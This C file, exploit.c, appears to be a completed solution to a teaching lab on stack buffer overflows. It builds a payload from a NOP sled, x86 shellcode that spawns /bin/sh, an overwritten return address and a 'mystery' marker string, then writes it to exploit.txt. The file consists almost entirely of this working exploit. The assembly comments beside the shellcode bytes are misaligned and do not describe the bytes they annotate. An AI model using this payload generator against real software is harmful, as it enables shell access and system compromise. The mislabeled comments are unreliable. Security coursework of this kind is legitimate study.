/*
 * File: exploit.c
 * Author: Gregory Mayer
 */


#include <stdlib.h>
#include <stdio.h>
#include <string.h>


/* Shellcode adapted from https://github.com/npapernot/buffer-overflow-attack */
char shellcode[] =
    "\x31\xdb"             /* xorl    %eax,%eax              */
    "\x8d\x43\x17"                 /* pushl   %eax                   */
    "\x99"           /* pushl   $0x68732f2f            */
    "\xcd\x80"           /* pushl   $0x6e69622f            */
    "\x31\xc9"             /* movl    %esp,%ebx              */
    "\x51"                 /* pushl   %eax                   */
    "\x68\x6e\x2f\x73\x68"                 /* pushl   %ebx                   */
    "\x68\x2f\x2f\x62\x69"             /* movl    %esp,%ecx              */
    "\x8d\x41\x0b"                 /* cdql                           */
    "\x89\xe3"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;


int main(int argc, char *argv[]) {

  /* Input the return address offset as argv[1] */
  if (argc != 2){
    printf("Invalid number of arguments\n");
    exit(1);
  }

  long offset = atol(argv[1]);

  /* TODO: Put the number of bytes needed to fully overwrite the return address here */
  int exploit_len = 280;

  /* We actually need one more byte than that for the NULL terminator */
  exploit_len ++;

  /* Allocate space for the exploit payload */
  char *exploit = malloc(exploit_len);
  if(exploit == NULL){
    exit(1);
  }

  /* Start by filling the exploit payload with 'A's */
  /* This makes sure there aren't any NULL bytes in it */
  int i;
  for(i = 0; i < exploit_len; i ++){
    exploit[i] = 'A';
  }

  /* Put the NOP sled in the exploit payload */
  /* TODO: Set values for nop_sled_offset and nop_sled_len */
  int nop_sled_offset = 0;
  int nop_sled_len = 280 - 28 - 4;
  for(i = 0; i < nop_sled_len; i++){
    exploit[i+nop_sled_offset] = 0x90;    /* NOP opcode is 0x90 */
  }

  /* Put the shellcode in the exploit payload */
  /* TODO: Determine shellcode_offset */
  int shellcode_offset = 280 - 28 - 4;
  strncpy((char*)(exploit + shellcode_offset), shellcode, strlen(shellcode));

  /* TODO: Put the address you want to return to here */
  /* You will need to try some different offsets on the command line */
  long ret_addr = 0xbfffed78;
  ret_addr += offset;

  /* Put the address we want to return to in the exploit payload*/
  long* temp_ptr = (long*)(exploit + exploit_len - 5);
  *temp_ptr = ret_addr;

  /* TODO: One more thing needs to go in the exploit payload for it to work! */
  /* What could it be? ¯\_(ツ)_/¯ */
  char *mystery = "Rock";
  int mystery_offset = 0;
  strncpy(exploit + mystery_offset, mystery, strlen(mystery));

  /* Add NULL terminator */
  exploit[exploit_len-1] = '\0';

  /* Write the exploit to exploit.txt */
  FILE *fp = fopen("exploit.txt", "wb");
  if(fp != NULL){
    fputs(exploit, fp);
  }

  return 0;
}
